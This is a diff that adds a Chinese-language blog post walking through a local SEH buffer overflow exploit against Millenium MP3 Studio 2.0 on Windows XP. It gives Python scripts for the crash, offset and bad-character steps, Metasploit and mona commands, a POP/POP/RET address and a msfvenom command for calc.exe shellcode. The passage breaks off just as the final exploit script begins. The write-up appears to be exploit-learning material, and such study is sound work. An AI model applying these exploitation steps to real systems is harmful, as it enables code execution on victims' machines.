@@ -188,6 +188,311 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2021/12/23/Millenium-MP3-Studio-2-0-Local-SEH-overflow/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="n0maj1o24">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Technical Memorandum">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/23/Millenium-MP3-Studio-2-0-Local-SEH-overflow/" class="post-title-link" itemprop="url">Millenium MP3 Studio 2.0 Local SEH overflow</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-12-22 21:10:29" itemprop="dateCreated datePublished" datetime="2021-12-22T21:10:29Z">2021-12-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-18 15:15:02" itemprop="dateModified" datetime="2022-02-18T15:15:02Z">2022-02-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Windows-Exploitation/" itemprop="url" rel="index"><span itemprop="name">Windows Exploitation</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/12/23/Millenium-MP3-Studio-2-0-Local-SEH-overflow/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/12/23/Millenium-MP3-Studio-2-0-Local-SEH-overflow/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>本次复现的程序链接：<a href="https://www.exploit-db.com/exploits/9895" target="_blank" rel="noopener">Millenium MP3 Studio 2.0 - ‘mpf’ Local Buffer Overflow</a></p>
+<p>环境为：win xp sp3 ，DEP情况如下：</p>
+<p><img src="/2021/12/23/Millenium-MP3-Studio-2-0-Local-SEH-overflow/offset6.png" alt="seh"></p>
+<p><strong>Fuzz</strong></p>
+<p>首先，创建<code>mpf</code>文件用于触发程序崩溃。<code>crash.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_name = <span class="string">"evil.mpf"</span></span><br><span class="line">junk = <span class="string">"A"</span>*<span class="number">5000</span></span><br><span class="line"><span class="keyword">with</span> open(file_name,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(junk)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"evil.mpf File Created successfully\n"</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>windbg</code>获取的<code>crash</code>截图如下：</p>
+<p><img src="/2021/12/23/Millenium-MP3-Studio-2-0-Local-SEH-overflow/crash.png" alt="seh"></p>
+<p>发现<code>SEH</code>链被覆盖，这个地方非常重要。现在计算覆盖<code>SEH</code>链第一个异常处理结构<code>SE  handler</code>需要多少字节。</p>
+<p><strong>Offset</strong></p>
+<p>我们需要确定需要多少字节能够覆盖<code>next SEH</code>、当前<code>SEH</code>结构的<code>SE Handler</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l 5000</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/12/23/Millenium-MP3-Studio-2-0-Local-SEH-overflow/offset1.png" alt="seh"></p>
+<p>重新构造一个<code>evil.mpf</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_name = <span class="string">"evil.mpf"</span></span><br><span class="line">junk = <span class="string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk"</span></span><br><span class="line"><span class="keyword">with</span> open(file_name,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(junk)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"evil.mpf File Created successfully\n"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>windbg</code>中重新打开，查看SEH链的值。</p>
+<p><img src="/2021/12/23/Millenium-MP3-Studio-2-0-Local-SEH-overflow/offset2.png" alt="seh1"></p>
+<p>这样可以知道<code>SEH Hander</code>被覆盖为<code>46326846</code>，进而可以确定<code>offset</code>的位置：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_offset -q 46326846</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/12/23/Millenium-MP3-Studio-2-0-Local-SEH-overflow/offset3.png" alt="seh"></p>
+<p>可以知道，<strong>4116</strong>个字符可以覆盖<code>SEH Handler</code>，<strong>4112</strong>个字符可以覆盖<code>Next SEH</code>。（参照SEH结构，<code>Next SEH</code>在<code>SEH Handler</code>前面）</p>
+<p><strong>Modules without SafeSEH</strong></p>
+<p><code>Immunity Debugger</code>中打开<code>MP3Studio.exe</code>，查找<code>P/P/R</code>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona seh -n</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/12/23/Millenium-MP3-Studio-2-0-Local-SEH-overflow/offset4.png" alt="seh"></p>
+<p><strong>注意：</strong>选择的<code>P/P/R</code>所在<code>DLL</code>应该<code>SafeSEH</code>为<code>False</code>。</p>
+<p><strong>Address of P/P/R</strong></p>
+<p>在这里我们选择<code>0x10014e98</code>地址所在的<code>P/P/R</code>。</p>
+<p><strong>Short jump on SEH</strong></p>
+<p>理论上<code>0xeb069090</code>就可以让<code>eip</code>指向<code>shellcode</code>的开始部分，触发<code>shellcode</code>。但是实际上跳转完成之后，后续中间可能存在脏字符，需要根据实际情况进行调整。如本例。用<code>\xcc\xcc\xcc\xcc</code>中断程序执行，来看一下栈上的数据的情况。当前使用的利用脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file_name = <span class="string">"exp.mpf"</span></span><br><span class="line"><span class="comment">#msf-pattern_create -l 5000</span></span><br><span class="line">junk = <span class="string">"A"</span>*<span class="number">4112</span></span><br><span class="line"><span class="comment"># nseh = "\xeb\x06\x90\x90" #jump 32 bytes</span></span><br><span class="line">nseh = <span class="string">"\xcc\xcc\xcc\xcc"</span></span><br><span class="line">seh = <span class="string">"\x98\x4e\x01\x10"</span>  <span class="comment">#0x10014e98</span></span><br><span class="line">nops = <span class="string">""</span></span><br><span class="line"><span class="comment"># nops = "\x90"*100</span></span><br><span class="line">shellcode = <span class="string">"D"</span>*(<span class="number">5000</span><span class="number">-4112</span><span class="number">-4</span><span class="number">-4</span>)</span><br><span class="line"><span class="keyword">with</span> open(file_name,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(junk+nseh+seh+nops+shellcode)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"exp.mpf File Created successfully\n"</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>windbg</code>中<code>eip</code>所指向栈空间数据如下：</p>
+<p><img src="/2021/12/23/Millenium-MP3-Studio-2-0-Local-SEH-overflow/offset5.png" alt="seh"></p>
+<p>注意上面标红的部分，出现了<code>\x00</code>，<code>shellcode</code>被截断了。为了让shellcode正常执行，可以用一段<code>\x90</code>指令填充这一块栈空间，然后再跟<code>shellcode</code>。</p>
+<p><strong>Bad characters</strong></p>
+<p>检查是否存在坏字符：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">badchars = (</span><br><span class="line">  <span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"</span></span><br><span class="line">  <span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</span></span><br><span class="line">  <span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"</span></span><br><span class="line">  <span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span></span><br><span class="line">  <span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"</span></span><br><span class="line">  <span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span></span><br><span class="line">  <span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"</span></span><br><span class="line">  <span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</span></span><br><span class="line">  <span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"</span></span><br><span class="line">  <span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</span></span><br><span class="line">  <span class="string">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"</span></span><br><span class="line">  <span class="string">"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</span></span><br><span class="line">  <span class="string">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"</span></span><br><span class="line">  <span class="string">"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</span></span><br><span class="line">  <span class="string">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"</span></span><br><span class="line">  <span class="string">"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>查询坏字符的程序如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">file_name = <span class="string">"badchar.mpf"</span></span><br><span class="line"><span class="comment">#msf-pattern_create -l 5000</span></span><br><span class="line">junk = <span class="string">"A"</span>*<span class="number">4112</span></span><br><span class="line"><span class="comment"># nseh = "\xeb\x06\x90\x90" #jump 32 bytes</span></span><br><span class="line">nseh = <span class="string">"\xcc\xcc\xcc\xcc"</span></span><br><span class="line">seh = <span class="string">"\x98\x4e\x01\x10"</span>  <span class="comment">#0x10014e98</span></span><br><span class="line"><span class="comment"># nops = ""</span></span><br><span class="line">nops = <span class="string">"\x90"</span>*<span class="number">100</span></span><br><span class="line"><span class="comment">#check badchars</span></span><br><span class="line"><span class="comment">#\x00\x0a\x0d\x1a</span></span><br><span class="line">shellcode = (</span><br><span class="line">  <span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"</span></span><br><span class="line">  <span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1b\x1c\x1d\x1e\x1f\x20"</span></span><br><span class="line">  <span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"</span></span><br><span class="line">  <span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span></span><br><span class="line">  <span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"</span></span><br><span class="line">  <span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span></span><br><span class="line">  <span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"</span></span><br><span class="line">  <span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</span></span><br><span class="line">  <span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"</span></span><br><span class="line">  <span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</span></span><br><span class="line">  <span class="string">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"</span></span><br><span class="line">  <span class="string">"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</span></span><br><span class="line">  <span class="string">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"</span></span><br><span class="line">  <span class="string">"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</span></span><br><span class="line">  <span class="string">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"</span></span><br><span class="line">  <span class="string">"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">with</span> open(file_name,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(junk+nseh+seh+nops+shellcode)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"badchar.mpf File Created successfully\n"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>最终，获取的坏字符为：<code>\x00\x0a\x0d\x1a</code></p>
+<p>生成弹计算器的<code>shellcode</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0a\x0d\x1a' -f c EXITFUNC=thread</span><br></pre></td></tr></table></figure>
+
+<p>最终<code>exp</code>如下所示：(<strong>注意跳转的长度，不止6字节</strong>)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 